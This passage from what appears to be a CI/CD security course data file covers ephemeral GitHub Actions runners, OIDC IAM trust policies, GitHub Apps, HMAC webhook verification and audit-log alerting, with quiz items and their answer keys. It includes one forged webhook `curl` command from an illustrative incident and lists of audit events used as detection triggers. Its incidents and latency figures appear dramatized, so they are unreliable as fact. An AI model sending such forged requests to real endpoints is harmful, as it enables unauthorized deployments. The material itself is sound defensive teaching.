                    "This catastrophe establishes two ironclad enterprise runner security laws: First, **Never** attach self-hosted runners to public repositories unless strictly isolated and gated by manual approval (`Require approval for all outside collaborators`). Second, **Never** run persistent, multi-job self-hosted VMs! Every self-hosted runner must be **Ephemeral** (configured with the `--ephemeral` flag), meaning the runner agent accepts exactly **one** job, executes it, and immediately terminates so the underlying container or VM is permanently destroyed.",
                    "In this detective investigation, we analyze the forensic artifacts of the Persistent Self-Hosted Runner Exfiltration breach and specify the architectural migration to ephemeral Kubernetes container runners.",
                    "Understanding persistent runner state contamination ensures you never deploy shared, dirty compute nodes inside a zero-trust CI/CD environment."
                ],
                "example": "A persistent self-hosted runner is like a hospital operating room that is never sterilized between patients—any contamination left by the first surgery infects the next person; an ephemeral runner builds a brand-new sterile modular room for one procedure and incinerates it the second the procedure ends.",
                "code": bash_snippets[(47, 2)],
                "output": bash_outputs[(47, 2)],
                "codeNotes": [
                    "Reconstructs the Persistent Self-Hosted Runner Disk Cache Exfiltration incident.",
                    "Identifies shared OS filesystems (/home/runner/_work, /tmp) across jobs as the root vulnerability.",
                    "Prohibits persistent multi-job VM runners and untrusted public PR execution.",
                    "Mandates ephemeral single-job container runners (--ephemeral) managed by Kubernetes ARC."
                ],
                "tryIt": "Run grep \"REMEDY\" /home/student/workspace/runner_leak_incident/postmortem.txt to verify the ephemeral runner remediation.",
                "check": {
                    "question": "Why are persistent (non-ephemeral) self-hosted runners a critical security vulnerability when shared across multiple jobs or untrusted pull requests?",
                    "options": [
                        "Because persistent runners reuse the same OS filesystem, environment, and background process table across consecutive jobs, allowing a subsequent job to read residual secrets or plant backdoors",
                        "Because self-hosted runners cannot execute bash scripts or Python programs",
                        "Because GitHub automatically publishes the IP address of all self-hosted runners on the public repository homepage",
                        "Because persistent runners only support SHA-1 and cannot verify SHA-256 commits"
                    ],
                    "answer": 0,
                    "why": "Persistent runners retain files in `/tmp`, `_work`, home directories, and local Docker caches across jobs, enabling cross-job credential theft and persistent malware installation."
                }
            },
            {
                "title": "Purging Static Keys & Engineering Scoped OIDC IAM Trust Policies",
                "say": [
                    "Let us now solve the Situational Production Puzzle from our Master Architecture Bible: a security engineer audits an enterprise AWS account and discovers 50 static IAM users named `github-actions-user-01` through `github-actions-user-50` whose access keys have not been rotated in three years. How do we systematically purge those 50 static IAM users and replace them with a hardened OIDC Cloud Federation architecture?",
                    "The migration requires configuring two distinct policy layers in AWS IAM (or Google Cloud IAM): the **Identity Provider Registration** and the **Role Trust Policy Condition**.",
                    "First, in AWS IAM, we register an OpenID Connect Provider with Provider URL `https://token.actions.githubusercontent.com` and Audience `sts.amazonaws.com`. This one-time account-level setup instructs AWS STS to trust cryptographic JWT signatures produced by GitHub's OIDC key infrastructure.",
                    "Second—and this is where subtle security bugs occur if an engineer is careless—we create an IAM Role for each service deployment (for example, `arn:aws:iam::123456789012:role/PaymentsApiProdDeployRole`) and author its **IAM Trust Policy** (`AssumeRolePolicyDocument`). Imagine what happens if an engineer writes a trust policy that checks that the issuer is `token.actions.githubusercontent.com`, but forgets to add a `Condition` checking the `sub` (Subject) claim!",
                    "If you omit the `sub` condition in your IAM Trust Policy, then **any** GitHub repository on earth—including a random attacker's personal repository on `github.com`—could generate a valid GitHub OIDC token and assume your company's production AWS IAM Role! Therefore, the IAM Trust Policy must enforce both `StringEquals` on `'token.actions.githubusercontent.com:aud': 'sts.amazonaws.com'` AND a strict `StringEquals` (or narrowly scoped `StringLike`) on `'token.actions.githubusercontent.com:sub'`.",
                    "For a production deployment role, we bind the subject claim strictly to the main branch of the specific repository: `'token.actions.githubusercontent.com:sub': 'repo:pinit-enterprise/payments-api:ref:refs/heads/main'`. With this condition in place, even a developer inside your own company running a workflow on a feature branch (`refs/heads/feature-test`) or opening a pull request (`refs/pull/42/merge`) is mathematically blocked by AWS STS from assuming the production deployment role!",
                    "For staging vs production separation, we can also bind the subject claim to a GitHub Deployment Environment (`repo:pinit-enterprise/payments-api:environment:production`), which pairs OIDC authentication with GitHub Environment Protection Rules (such as mandatory manual sign-off by two Principal SREs before the `id-token` can even be minted).",
                    "In this mastery lab, we execute the Zero-Secret OIDC Cloud Deployment Engine in our workspace, verifying the strict `repo:pinit-enterprise/payments-api:ref:refs/heads/main` trust policy, purging all 50 legacy static IAM keys, and issuing an ephemeral STS session.",
                    "By binding cloud IAM roles directly to cryptographic Git branch and environment claims, you achieve ironclad least-privilege access control across your entire cloud estate."
                ],
                "example": "An OIDC IAM Role without a `sub` claim condition is like a building security guard who lets anyone inside as long as they show a valid driver's license from any state; adding the `sub` condition requires that the name and employee ID on the license match the exact authorized surgeon scheduled for Operating Room 1.",
                "code": bash_snippets[(47, 3)],
                "output": bash_outputs[(47, 3)],
                "codeNotes": [
                    "Executes the Zero-Secret OIDC Cloud Deployment Pipeline migration.",
                    "Enforces strict IAM Trust Policy binding on sub=repo:pinit-enterprise/payments-api:ref:refs/heads/main.",
                    "Purges 50 legacy 3-year-old static github-actions-user IAM access keys.",
                    "Mints an ephemeral AWS STS role session strictly for verified main branch deployments."
                ],
                "tryIt": "Run grep \"IAM_TRUST_POLICY\" /home/student/workspace/oidc_cloud_engine/deploy_log.txt to inspect the repository and branch subject binding.",
                "check": {
                    "question": "What catastrophic vulnerability occurs if you configure an AWS IAM Role to trust GitHub's OIDC provider (`token.actions.githubusercontent.com`), but omit the `Condition` checking the `token.actions.githubusercontent.com:sub` claim?",
                    "options": [
                        "Any GitHub user or organization in the world can run a workflow in their own repository and assume your AWS IAM Role, because their JWT is also validly signed by GitHub's OIDC provider",
                        "The IAM Role will only work on Tuesdays and Thursdays",
                        "GitHub Actions will refuse to start any workflow in your repository",
                        "AWS will automatically convert the IAM Role into an S3 bucket"
                    ],
                    "answer": 0,
                    "why": "GitHub's OIDC provider (`token.actions.githubusercontent.com`) is shared across all GitHub users; only the `sub` claim restricts role assumption to your specific organization, repository, and branch."
                }
            },
            {
                "title": "Actions Runner Controller (ARC) on Kubernetes: Ephemeral Pod Orchestration",
                "say": [
                    "Having solved zero-secret cloud authentication via OIDC, how do we solve the compute isolation problem for Self-Hosted Runners at enterprise scale? The industry standard is **Actions Runner Controller (ARC)** running on Kubernetes (`actions/actions-runner-controller`).",
                    "Let us examine how ARC transforms self-hosted runner security and elasticity. Instead of provisioning static virtual machines that sit idle overnight burning cloud budget and accumulating dirty state across jobs, ARC deploys a Kubernetes operator inside your private EKS or GKE cluster that watches a `RunnerScaleSet` Custom Resource Definition (CRD).",
                    "When zero GitHub Actions jobs are queued, ARC scales the runner pool all the way down to zero pods (`minRunners: 0`), consuming zero compute cores. The millisecond a developer pushes a commit or opens a pull request, GitHub's webhook/long-polling scale-set listener notifies the ARC controller inside the Kubernetes cluster.",
                    "ARC immediately provisions a brand-new, pristine Kubernetes Pod from an immutable container image and registers the runner agent with the `--ephemeral` flag. If a 50-job monorepo matrix build is triggered, ARC elastically spawns 50 parallel ephemeral runner pods across the Kubernetes cluster nodes (scaling underlying compute nodes via Karpenter or Cluster Autoscaler).",
                    "What happens inside each ephemeral pod during and after the job? The pod executes solely that single assigned CI job inside an isolated Linux namespace (cgroups, mount namespace, PID namespace, and network policy). The moment that single job finishes—whether it succeeds, fails, or is cancelled—the runner process exits with code 0, and Kubernetes immediately terminates and garbage-collects the entire pod and its ephemeral container filesystem overlay!",
                    "Even if a job wrote temporary credentials to `/tmp`, modified `/home/runner`, or attempted to spawn a background daemon process, the entire container root filesystem and PID namespace are vaporized upon pod termination. The very next job in the queue is guaranteed to start in a 100% clean, freshly instantiated container pod with zero bytes of residual state from any prior execution.",
                    "For workflows that require building Docker images inside an ephemeral Kubernetes pod without granting dangerous `privileged: true` root access to the host node's Docker daemon socket, enterprise architects pair ARC with rootless container builders like **Kaniko** or **BuildKit rootless**, or sidecar Docker-in-Docker (`dind`) containers restricted by Kubernetes Pod Security Standards (`restricted` or `baseline`).",
                    "In this production incident lab, we stress-test an ARC cluster under 50 concurrent build jobs, verifying elastic pod scheduling, 100% post-job filesystem destruction, and zero cross-job state leakage.",
                    "Mastering Kubernetes ARC architecture enables you to deliver cloud-native, auto-scaling, zero-trust private build infrastructure for the largest engineering organizations."
                ],
                "example": "Actions Runner Controller (ARC) on Kubernetes is like an on-demand fleet of disposable sterile lab capsules: when 50 experiments arrive, 50 sealed capsules materialize in seconds, run one experiment each, and are immediately recycled into raw atoms upon completion.",
                "code": bash_snippets[(47, 4)],
                "output": bash_outputs[(47, 4)],
                "codeNotes": [
                    "Orchestrates self-hosted runners via Actions Runner Controller (ARC) on Kubernetes.",
                    "Spawns 50 parallel ephemeral container runner pods under concurrent matrix load.",
                    "Enforces 100% pod and container filesystem teardown immediately after single-job completion.",
                    "Certifies 0 bytes of cross-job residual state leakage across all 50 isolated executions."
                ],
                "tryIt": "Run grep \"CROSS_JOB_LEAKAGE\" /home/student/workspace/arc_ephemeral_lab/isolation_report.txt to verify complete filesystem isolation.",
                "check": {
                    "question": "How does Actions Runner Controller (ARC) on Kubernetes guarantee that sensitive files or malware from one CI job cannot contaminate subsequent CI jobs?",
                    "options": [
                        "By provisioning each runner as an ephemeral (`--ephemeral`) Kubernetes pod that executes exactly one job and is immediately terminated and destroyed upon job completion",
                        "By running an antivirus scan once every Sunday at midnight on a shared virtual machine",
                        "By asking developers to manually add `rm -rf *` at the end of their YAML files",
                        "By blocking all jobs that take longer than 10 seconds to run"
                    ],
                    "answer": 0,
                    "why": "ARC provisions single-use `--ephemeral` pods; once a single job finishes, the pod and its entire container filesystem and process tree are destroyed by Kubernetes."
                }
            },
            {
                "title": "Master Zero-Secret OIDC & Ephemeral Runner Gateway Certification",
                "say": [
                    "We conclude Day 47 by deploying the `MasterZeroSecretOidcGateway`, the automated security gatekeeper that certifies both identity federation and compute ephemerality across our enterprise CI/CD infrastructure.",
                    "In a mature cloud-native enterprise, security posture cannot rely on periodic manual reviews; it must be continuously verified by automated policy gates. Our `MasterZeroSecretOidcGateway` executes a comprehensive three-point audit across all repositories, cloud IAM accounts, and runner groups:",
                    "First, **Zero Static Cloud Keys in GitHub Secrets**: The gateway scans repository, environment, and organization secret metadata alongside workflow YAML files to verify that zero static `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `GCP_SA_KEY`, or `AZURE_CREDENTIALS` secrets exist. All cloud deployment steps must authenticate exclusively via `id-token: write` OIDC token exchange.",
                    "Second, **Strict OIDC Subject Claim Enforcement**: The gateway inspects AWS IAM Role Trust Policies and GCP Workload Identity Pool attribute mappings to confirm that every federated role enforces an explicit `sub` condition restricting assumption to authorized repository paths and protected branches (`refs/heads/main`) or approved deployment environments.",
                    "Third, **100% Ephemeral Runner Isolation**: All registered self-hosted runner scale sets are audited via the GitHub Enterprise Administration API to confirm that `ephemeral: true` is enforced on every runner group, and that public repositories are strictly blocked from accessing internal private VPC runner pools.",
                    "Think about the operational transformation you have achieved across Day 46 and Day 47: your organization's CI/CD pipelines are now modularized via centralized `workflow_call` templates, pinned to immutable 40-character commit SHAs, accelerated by 80% via lockfile caching, authenticated to AWS and GCP with zero stored secrets via 60-minute OIDC JWTs, and executed inside single-use Kubernetes ARC pods that self-destruct after every build.",
                    "Let us run the `MasterZeroSecretOidcGateway` verification suite in our workspace to validate our zero-secret posture and issue the sovereign `ZERO-SECRET-OIDC-FEDERATION-CERTIFIED` audit seal.",
                    "Tomorrow in Day 48, we step into the shoes of a Principal GitHub Enterprise Administrator, mastering GitHub Apps vs Fine-Grained PATs, cryptographic Webhook HMAC signature verification, and real-time SIEM Audit Log Streaming!"
                ],
                "example": "The Master Zero-Secret OIDC Gateway is the ultimate zero-trust customs checkpoint: it verifies that no worker carries permanent master keys (0 static secrets) and that every compute workspace is vaporized after a single mission (100% ARC ephemerality).",
                "code": bash_snippets[(47, 5)],
                "output": bash_outputs[(47, 5)],
                "codeNotes": [
                    "Executes MasterZeroSecretOidcGateway across all cloud roles and runner scale sets.",
                    "Verifies 0 long-lived static cloud keys stored in GitHub repository or organization secrets.",
                    "Confirms 100% single-use ephemeral container isolation via Kubernetes ARC.",
                    "Issues the sovereign ZERO-SECRET-OIDC-FEDERATION-CERTIFIED audit seal."
                ],
                "tryIt": "Run cat /home/student/workspace/oidc_runner_gateway/gateway_seal.txt to inspect the sovereign OIDC and runner isolation seal.",
                "check": {
                    "question": "What workflow permission must be explicitly declared in a GitHub Actions YAML job so the runner is allowed to request an OpenID Connect (OIDC) JWT from GitHub?",
                    "options": [
                        "`permissions: id-token: write`",
                        "`permissions: secrets: admin`",
                        "`permissions: sudo: root`",
                        "`permissions: aws-keys: read`"
                    ],
                    "answer": 0,
                    "why": "GitHub Actions requires `permissions: id-token: write` at the workflow or job level to permit the runner to request a signed OIDC JWT from GitHub's OIDC provider."
                }
            }
        ]
    },

    48: {
        "day": 48,
        "coursePrefix": "git_vcs",
        "title": "GitHub Enterprise Administration: GitHub Apps vs Fine-Grained PATs, Webhooks & Audit Log Streaming",
        "goal": "Master enterprise-scale GitHub administration and integration security: eliminate brittle human-tied Personal Access Tokens (PATs) by architecting organization-owned GitHub Apps with RS256 JWT authentication and 60-minute installation access tokens, secure internal webhook receivers against forged payload injection using constant-time HMAC-SHA256 (`X-Hub-Signature-256`) cryptographic verification, and configure real-time GitHub Enterprise Audit Log Streaming to SIEM platforms.",
        "summary": [
            "Replaced human-bound Personal Access Tokens (PATs) with organization-owned GitHub Apps using RS256 JWTs, 60-minute installation tokens, and 15,000 req/hr enterprise rate limits.",
            "Investigated the Departed Engineer PAT Revocation Production Blackout across 40 microservices and the Unauthenticated Webhook Injection vulnerability.",
            "Engineered a secure GitHub App backend and webhook listener verifying `X-Hub-Signature-256` HMAC-SHA256 digests via constant-time comparison (`hmac.compare_digest`).",
            "Configured real-time GitHub Enterprise Audit Log Streaming to SIEM platforms monitoring high-risk administrative events (`repo.destroy`, `protected_branch.policy_override`).",
            "Issued the sovereign GITHUB-ENTERPRISE-GOVERNANCE-CERTIFIED audit seal via MasterEnterpriseIdentityGateway."
        ],
        "projectStep": {
            "title": "Stage 10 Enterprise GitHub Engineering: GitHub Apps, HMAC Webhooks & Audit Streaming",
            "steps": [
                "Architect GitHub App RS256 JWT and installation token flows using GitHubAppIdentityArchitect.",
                "Audit human PAT blackout incidents and forged webhook vulnerabilities using EnterpriseAuthForensicAuditor.",
                "Implement constant-time X-Hub-Signature-256 HMAC verification using SecureWebhookReceiverEngine.",
                "Stream high-risk enterprise audit events to SIEM storage using EnterpriseAuditLogStreamer.",
                "Issue the sovereign GITHUB-ENTERPRISE-GOVERNANCE-CERTIFIED audit seal via MasterEnterpriseIdentityGateway."
            ]
        },
        "parts": [
            {
                "title": "Organization Service Identities: GitHub Apps vs Personal Access Tokens (PATs)",
                "say": [
                    "Welcome to Day 48 of PinIT Career OS. In a Fortune 500 engineering organization managing one thousand repositories and three thousand developers, automation bots constantly interact with the GitHub API—labeling pull requests, triggering external Jenkins or Tekton builds, synchronizing Jira tickets, and cutting releases. How should these automated services authenticate to GitHub?",
                    "In immature organizations, engineers generate a **Personal Access Token (PAT)** under their own personal GitHub user account and paste that token into the automation bot's configuration. Even with modern Fine-Grained PATs (which improve upon Legacy Classic `ghp_` PATs by scoping access to specific repositories and permissions), any PAT remains fundamentally bound to a single human employee's identity.",
                    "Why is tying production automation to a human employee's PAT an operational time bomb? First, **Turnover Fragility**: the moment that engineer leaves the company or transfers departments and IT deactivates their corporate SSO account, every PAT owned by that user is instantaneously revoked, causing an immediate production blackout across every pipeline using it.",
                    "Second, **Audit Attribution Blindness**: when a human PAT performs automated actions across forty repositories, the GitHub Audit Log records every bot commit and API call as if the human engineer personally executed it, muddying forensic accountability. Third, **API Rate-Limit Starvation**: a human PAT shares a single 5,000 requests-per-hour quota across everything that user does.",
                    "The gold-standard enterprise architecture is an organization-owned **GitHub App**. A GitHub App is a first-class, non-human service identity installed directly at the Organization or Enterprise level, completely decoupled from individual employee lifecycles. Even if the entire platform engineering team changes jobs over five years, the GitHub App continues operating without interruption.",
                    "How does a GitHub App authenticate? It uses a two-step cryptographic handshake: First, the GitHub App backend holds an RSA private key (`.pem`) stored in a hardware security module or cloud secret manager. To authenticate, the app signs a short-lived JSON Web Token (JWT) using the `RS256` algorithm (valid for a maximum of 10 minutes) containing its `iss` (App ID), `iat` (issued-at timestamp), and `exp` (expiration timestamp).",
                    "Second, the app presents this RS256 JWT to `POST /app/installations/{installation_id}/access_tokens`. GitHub verifies the RSA signature against the App's registered public key and issues an **Installation Access Token** (`ghs_...`) that automatically expires after exactly **60 minutes**! Furthermore, this installation token can be dynamically down-scoped at request time to a single repository and minimal permissions (such as `contents: read` and `pull_requests: write`), and scales elastically up to 15,000+ API requests per hour in GitHub Enterprise.",
                    "In this opening lab, we codify the Organization GitHub App Service Identity architecture in our workspace, verifying the RS256 JWT exchange, 60-minute installation token lifecycle, and enterprise rate-limit scaling.",
                    "Mastering GitHub Apps architecture eliminates human-credential SPOFs (Single Points of Failure) and establishes least-privilege machine identity across your enterprise."
                ],
                "example": "A Personal Access Token (PAT) is like letting the company delivery fleet drive using the founder's personal driver's license—if the founder retires, every truck is impounded; a GitHub App is an official corporate commercial fleet registration owned by the company itself, issuing 60-minute trip passes per vehicle.",
                "code": bash_snippets[(48, 1)],
                "output": bash_outputs[(48, 1)],
                "codeNotes": [
                    "Establishes Organization GitHub App Service Identities decoupled from human user accounts.",
                    "Details the two-stage auth flow: RS256 Private Key JWT (10m) -> Installation Access Token (60m).",
                    "Enforces least-privilege granular API scopes (contents:read, pull_requests:write).",
                    "Unlocks elastic GitHub Enterprise API rate limits scaling up to 15,000 requests/hour."
                ],
                "tryIt": "Run grep \"AUTH_FLOW\" /home/student/workspace/ghe_app_identity/identity_spec.txt to inspect the two-step cryptographic token handshake.",
                "check": {
                    "question": "Why are GitHub Apps architecturally superior to Personal Access Tokens (even Fine-Grained PATs) for enterprise automation?",
                    "options": [
                        "GitHub Apps are organization-owned service identities decoupled from human employee turnover, issue auto-expiring 60-minute installation tokens (`ghs_`) via RS256 JWTs, and scale API rate limits with organization size",
                        "GitHub Apps never require permissions to read or write repository data",
                        "Personal Access Tokens cannot be used with HTTPS connections",
                        "GitHub Apps store their private keys in plaintext inside every public repository"
                    ],
                    "answer": 0,
                    "why": "Unlike PATs, which are tied to a specific human account (breaking automation when the employee leaves), GitHub Apps act as independent organizational identities with 60-minute installation tokens and scalable rate limits."
                }
            },
            {
                "title": "The Departed Engineer PAT Blackout & Unauthenticated Webhook Injection",
                "say": [
                    "Let us now investigate two real-world production incidents from our Master Architecture Bible that strike enterprise teams who neglect service identity and webhook cryptography: **The Departed Engineer PAT Revocation Blackout** and **The Unauthenticated Webhook Injection Attack**.",
                    "In the first half of our forensic post-mortem, a Principal DevOps Engineer who had worked at a fintech company for four years accepted a role at another firm. Three years earlier, that engineer had generated a Personal Access Token under their GitHub account and used it to configure the organization's central release bot, container registry sync service, and Terraform cloud webhook bridge across 40 microservices.",
                    "At 5:00 PM on the engineer's last day, the IT Identity team executed their standard offboarding runbook, deprovisioning the engineer's Okta SSO account and removing their user seat from the GitHub Enterprise organization. Within 500 milliseconds, GitHub invalidated every Personal Access Token associated with that user ID. Immediately, 40 production microservice deployment pipelines crashed with `HTTP 401 Bad Credentials` right in the middle of a scheduled Friday release window, halting engineering operations for six hours while teams scrambled to locate every hidden service where the token had been pasted.",
                    "During the emergency security audit that followed, penetration testers uncovered a second, even more dangerous vulnerability on the company's webhook receiver endpoint (`https://api.company.com/github-webhook`). Whenever a release tag was created on GitHub, GitHub sent an HTTP `POST` webhook JSON payload to that URL to trigger a production deployment.",
                    "However, the developer who wrote the webhook receiver simply parsed `req.body.ref` from the incoming JSON and triggered the deployment without verifying **who** sent the HTTP request! Because the URL was reachable on the public internet, the penetration tester ran a single `curl -X POST https://api.company.com/github-webhook -d '{\"ref\": \"refs/tags/v9.9.9-malicious\"}'` command from a coffee shop laptop and triggered an unauthorized production deployment!",
                    "How do we make it mathematically impossible for an attacker to forge a GitHub webhook request? By enforcing **Cryptographic HMAC-SHA256 Webhook Signature Verification** via the `X-Hub-Signature-256` HTTP header! When you configure a Webhook Secret in your GitHub App or repository settings, GitHub computes a Hash-based Message Authentication Code (HMAC) using SHA-256 over the exact raw request body bytes using the shared secret key, and attaches `X-Hub-Signature-256: sha256=<hex_digest>` to every HTTP request.",
                    "In this detective challenge, we document the forensic timeline of the 40-service PAT revocation blackout and the unauthenticated webhook injection flaw, establishing mandatory GitHub App migration and HMAC verification controls.",
                    "Eliminating human PAT dependencies and unverified webhook endpoints protects your enterprise from both catastrophic offboarding outages and remote command injection."
                ],
                "example": "An unauthenticated webhook endpoint is like an automated bank vault that opens whenever anyone shouts 'Open Sesame' through the mail slot; HMAC-SHA256 verification requires the message to bear an unforgeable cryptographic wax seal pressed with a secret key known only to GitHub and your server.",
                "code": bash_snippets[(48, 2)],
                "output": bash_outputs[(48, 2)],
                "codeNotes": [
                    "Audits the 40-service production blackout caused by offboarding an engineer whose PAT powered CI bots.",
                    "Uncovers the Unauthenticated Webhook Injection vulnerability on public HTTP POST listeners.",
                    "Mandates migrating all automation credentials from human PATs to organization GitHub Apps.",
                    "Enforces cryptographic HMAC-SHA256 verification on the X-Hub-Signature-256 HTTP header."
                ],
                "tryIt": "Run grep \"SECOND_FINDING\" /home/student/workspace/ghe_pat_blackout/incident_report.txt to inspect the webhook vulnerability.",
                "check": {
                    "question": "How does a webhook receiver mathematically guarantee that an incoming HTTP POST payload genuinely originated from GitHub and was not forged or modified in transit?",
                    "options": [
                        "By computing the HMAC-SHA256 digest of the raw request payload body using the shared webhook secret and comparing it in constant time against the `X-Hub-Signature-256` HTTP header",
                        "By checking if the JSON body contains the word `github`",
                        "By verifying that the request uses HTTP port 80 instead of HTTPS port 443",
                        "By trusting the `X-Forwarded-For` header sent by the client"
                    ],
                    "answer": 0,
                    "why": "GitHub signs the raw webhook payload bytes with the shared secret using HMAC-SHA256 and transmits the digest in `X-Hub-Signature-256`; only a party possessing the secret key can produce a valid signature."
                }
            },
            {
                "title": "Engineering Constant-Time HMAC Webhook Receivers & Token Rotation",
                "say": [
                    "Let us now dive into the low-level cryptographic implementation details of building an enterprise-grade GitHub App Webhook Receiver. Even when engineers know they need to verify the `X-Hub-Signature-256` header, two subtle implementation bugs frequently introduce severe security vulnerabilities in production Node.js, Python, and Go backends.",
                    "The first bug is **Re-Serializing Parsed JSON Instead of Hashing Raw Bytes**. Suppose an Express.js or FastAPI server parses the incoming HTTP body into a JSON object (`JSON.parse`), and then calls `JSON.stringify(body)` before computing the HMAC-SHA256 hash. If GitHub's payload contained whitespace formatting or specific key ordering that differs by even a single space character after re-serialization, the SHA-256 avalanche effect produces a completely different hash, causing valid GitHub webhooks to fail sporadically!",
                    "Therefore, your webhook listener must compute `HMAC_SHA256(webhook_secret, raw_request_body_bytes)` over the exact, unmodified byte stream received over the TCP socket prior to JSON parsing.",
                    "The second, even more insidious bug is **Using Standard String Equality (`==` or `===`) to Compare Cryptographic Signatures**. Why is `if (computedSignature === headerSignature)` a vulnerability? Because standard string comparison in C, Python, and JavaScript operates byte-by-byte from left to right and returns `false` on the very first mismatched character!",
                    "This early-exit optimization creates a **Side-Channel Timing Attack**. By sending thousands of forged requests and measuring microsecond variations in HTTP response latency, an attacker can deduce when the first hex character matches, then the second, then the third—recovering the valid 64-character HMAC signature for a forged payload in linear time $O(N)$ instead of $2^{256}$ brute-force time!",
                    "To defeat timing attacks, enterprise cryptography mandates **Constant-Time Digest Comparison**: `hmac.compare_digest(computed_sig, header_sig)` in Python or `crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b))` in Node.js. Constant-time comparison bitwise-XORs every single byte of both strings before returning a result, guaranteeing that the comparison takes the exact same number of CPU clock cycles whether mismatch occurs on the first byte or the last byte.",
                    "Alongside webhook verification, our GitHub App backend manages automated **Installation Token Rotation**: caching the `ghs_` token in memory for 50 minutes and transparently refreshing it via RS256 JWT exchange 10 minutes before its 60-minute expiration ceiling.",
                    "In this implementation lab, we deploy the Enterprise GitHub App & HMAC Webhook Verification Engine, confirming constant-time `X-Hub-Signature-256` validation, HTTP 401 rejection of tampered payloads, and 60-minute installation token rotation.",
                    "Writing constant-time, raw-byte HMAC verifiers is a hallmark of senior security systems engineering."
                ],
                "example": "Using `===` to compare HMAC signatures is like a safe lock that clicks audibly after each correct dial number, letting a safecracker guess one digit at a time; `hmac.compare_digest` (constant-time comparison) is a silent digital lock that always takes exactly 100 microseconds to check all 64 digits at once.",
                "code": bash_snippets[(48, 3)],
                "output": bash_outputs[(48, 3)],
                "codeNotes": [
                    "Deploys the Enterprise GitHub App & HMAC Webhook Verification Engine.",
                    "Validates X-Hub-Signature-256 over raw request bytes using constant-time digest comparison.",
                    "Rejects tampered or unsigned POST payloads with HTTP 401 Unauthorized.",
                    "Automates 60-minute GitHub App installation token lifecycle rotation."
                ],
                "tryIt": "Run grep \"SIGNATURE_HEADER\" /home/student/workspace/ghe_webhook_receiver/webhook_audit.txt to verify constant-time HMAC checking.",
                "check": {
                    "question": "Why must a webhook receiver use a constant-time comparison function (like `hmac.compare_digest` or `crypto.timingSafeEqual`) rather than standard `===` string equality when verifying `X-Hub-Signature-256`?",
                    "options": [
                        "Standard `===` string comparison exits early on the first mismatched byte, leaking response-time differences that enable side-channel timing attacks to forge signatures byte by byte",
                        "Standard `===` cannot compare strings longer than 16 characters",
                        "Constant-time comparison compresses the JSON payload by 90%",
                        "GitHub encrypts the header using Caesar ciphers that only `timingSafeEqual` can decrypt"
                    ],
                    "answer": 0,
                    "why": "Standard equality short-circuits on the first differing byte; constant-time comparison inspects all bytes uniformly to prevent attackers from guessing the HMAC digest via microsecond timing side channels."
                }
            },
            {
                "title": "GitHub Enterprise Audit Log Streaming & High-Frequency SIEM Alerting",
                "say": [
                    "Even with GitHub Apps and HMAC-verified webhooks in place, how does a Chief Information Security Officer (CISO) detect an compromised organization owner account or an insider threat attempting to exfiltrate repositories or disable branch protections at 3:00 AM? The answer is **GitHub Enterprise Audit Log Streaming**.",
                    "By default, GitHub retains organization audit logs in the web UI for a limited window, and if a rogue administrator compromises an enterprise owner account, their very first action is to delete repositories (`repo.destroy`), downgrade branch protection rules (`protected_branch.policy_override`), or mint unauthorized deploy keys (`public_key.create`). Relying on manual periodic CSV exports of the audit log is useless against real-time threats.",
                    "GitHub Enterprise enables real-time, low-latency **Audit Log Streaming** directly to external Security Information and Event Management (SIEM) and immutable cloud storage sinks—including Splunk, Datadog Security Monitoring, Amazon S3 (with S3 Object Lock WORM—Write Once, Read Many compliance mode), Azure Event Hubs, and Google Cloud Storage.",
                    "Every administrative, authentication, Git transport (`git.clone`, `git.push`, `git.fetch`), and permission mutation event across the entire enterprise is serialized as a structured JSON event stream and delivered within milliseconds to the external SIEM—outside the reach of even a compromised GitHub Enterprise Owner!",
                    "What high-severity event categories must an enterprise SOC (Security Operations Center) configure for real-time PagerDuty alerting? First, **Governance Tampering Events**: `protected_branch.destroy`, `protected_branch.policy_override`, and `repository_ruleset.destroy`—indicating someone bypassed or disabled code review and status check gates.",
                    "Second, **Privilege Escalation & Identity Events**: `org.add_member`, `org.update_member` (upgrading a member to `admin` owner), `team.add_repository`, and `oauth_application.create`. Third, **Mass Data Exfiltration & Destruction**: `repo.destroy`, `repo.access` (changing a private corporate repository to `public`!), and anomalous spikes in `git.clone` events from unfamiliar autonomous system numbers (ASNs) or IP addresses.",
                    "In our production incident lab, we configure the GitHub Enterprise Audit Log Streaming pipeline to Splunk/Datadog and S3 Object Lock, inject a simulated unauthorized branch protection override, and verify that the SIEM anomaly detector flags and alerts on the violation within 180 milliseconds.",
                    "Real-time audit log streaming transforms your GitHub Enterprise organization into a transparent, tamper-evident glass house where no administrative action goes unobserved."
                ],
                "example": "GitHub Enterprise Audit Log Streaming to an external WORM S3 bucket and SIEM is like an aircraft's black box flight data recorder combined with live satellite telemetry to air traffic control: even if someone tampers with the cockpit instruments, air traffic control sees the anomaly in 180 milliseconds and the black box record is immutable.",
                "code": bash_snippets[(48, 4)],
                "output": bash_outputs[(48, 4)],
                "codeNotes": [
                    "Streams GitHub Enterprise Audit Logs in real time to SIEM (Splunk/Datadog) and S3 Object Lock.",
                    "Monitors critical events: repo.destroy, org.update_member, and protected_branch.policy_override.",
                    "Detects and alerts on an unauthorized branch protection bypass within 180ms.",
                    "Archives immutable event ledgers to Write-Once-Read-Many (WORM) cloud storage for SOC 2 compliance."
                ],
                "tryIt": "Run grep \"ANOMALY_DETECTED\" /home/student/workspace/ghe_audit_stream/siem_events.txt to inspect the real-time SIEM detection latency.",
                "check": {
                    "question": "Why is streaming GitHub Enterprise Audit Logs in real time to an external SIEM and WORM (Write-Once-Read-Many) storage critical for enterprise security?",
                    "options": [
                        "It ensures that high-risk events (like `repo.destroy`, making a private repo public, or bypassing branch protection) trigger sub-second security alerts and remain preserved in an external immutable ledger that even a compromised GitHub admin cannot erase",
                        "It automatically rewrites legacy Python 2 code into Python 3",
                        "It increases the maximum file size limit of Git commits from 100 MB to 50 TB",
                        "It replaces the need for HTTPS encryption on GitHub.com"
                    ],
                    "answer": 0,
                    "why": "Streaming audit logs externally provides immediate anomaly detection for privilege escalations, exfiltration, or policy overrides, and guarantees tamper-proof forensic retention outside GitHub."
                }
            },
            {
                "title": "Master Enterprise Identity & Webhook Governance Gateway Certification",
                "say": [
                    "We conclude Day 48 by deploying the `MasterEnterpriseIdentityGateway`, the automated administrative compliance gatekeeper that certifies service identities, webhook cryptography, and audit telemetry across our GitHub Enterprise organization.",
                    "When managing an enterprise engineering organization with hundreds of repositories and dozens of internal developer platform integrations, governance must be enforced programmatically. Our `MasterEnterpriseIdentityGateway` executes a three-pillar institutional verification:",
